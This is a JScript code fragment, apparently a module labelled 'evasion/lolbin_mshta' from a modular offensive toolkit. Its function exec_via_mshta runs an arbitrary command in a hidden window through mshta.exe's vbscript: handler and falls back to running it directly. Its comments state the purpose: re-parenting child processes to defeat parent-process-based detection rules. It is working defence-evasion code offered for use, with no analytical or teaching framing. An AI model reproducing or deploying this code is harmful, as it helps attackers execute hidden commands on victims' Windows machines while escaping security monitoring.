// chunk: evasion/lolbin_mshta
// depends: (none)
// provides: exec_via_mshta
// format: jscript
// note: Re-invokes script execution via mshta.exe for process re-parenting.
//       Child processes appear under mshta.exe instead of wscript/cscript,
//       defeating parent-process-based detection rules.

function exec_via_mshta(cmd) {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        /* mshta can execute VBScript which in turn shells out */
        var mshtaCmd = 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""' +
            cmd.replace(/"/g, '""') + '"", 0, False:close")';
        sh.Run(mshtaCmd, 0, false);
    } catch(e) {
        /* Fallback: direct execution */
        var sh2 = new ActiveXObject("WScript.Shell");
        sh2.Run(cmd, 0, false);
    }
}
